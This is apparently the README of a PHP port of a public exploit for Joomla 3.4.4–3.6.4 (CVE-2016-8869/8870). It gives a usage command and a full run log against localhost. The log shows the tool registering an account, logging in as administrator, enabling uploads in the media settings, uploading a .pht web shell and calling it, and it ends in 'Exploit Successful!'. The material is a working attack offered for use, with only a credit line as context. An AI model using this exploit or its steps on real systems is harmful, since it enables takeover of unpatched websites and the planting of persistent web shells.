Exploit for Joomla 3.4.4 - 3.6.4 (CVE-2016-8869 and CVE-2016-8870) with File Upload web shell

This is PHP port, original python source code provided by
@link https://github.com/XiphosResearch/exploits/tree/master/Joomraa

Usage: php exploit.php --username hacker -p password -e hacker@example.com http://localhost:9994/

[0.000] Booting...
[0.000] Victim is http://localhost:9994
[0.000] [-] Getting token
[0.464] ..fetch | GET | /index.php/component/users/?view=login | 200
[0.464] Token | 6cebed4c64eae7e8915b0bc7e0ca354e
[0.464] [-] Creating user account
[0.760] ..fetch | POST | /index.php/component/users/?task=user.register | 303
[0.760] [!] Account not created or already exists
[0.760] [-] Getting token for admin login
[1.113] ..fetch | GET | /administrator/index.php | 200
[1.113] Token | af3c362c9aa19347451656d2d24b79f2
[1.113] [-] Logging in to admin
[2.368] ..fetch | POST | /administrator/index.php | 200
[2.368] [+] Admin Login Success!
[2.368] [+] Getting media options
[3.221] ..fetch | GET | /administrator/index.php?option=com_config&view=component&component=com_media&path= | 200
[4.470] ..fetch | POST | /administrator/index.php?option=com_config | 200
[4.470] [*] Upload shell
[5.329] ..fetch | GET | /administrator/index.php?option=com_media&folder= | 200
[5.330] [-] Uploading exploit to | /images/1k8iusc.pht
[6.415] ..fetch | POST | http://localhost:9994/administrator/index.php?option=com_media&task=file.upload&tmpl=component&ed5766f9587758a07f90d6b1ba846723=r2pci9ua7bao40na38foiq7da7&b5dab50228f1e955bae66d8950cc29a7=1&format=html | 200
[6.415] [*] Calling exploit
[6.417] ..fetch | GET | /1.php | 200
[6.417] [$] Exploit Successful!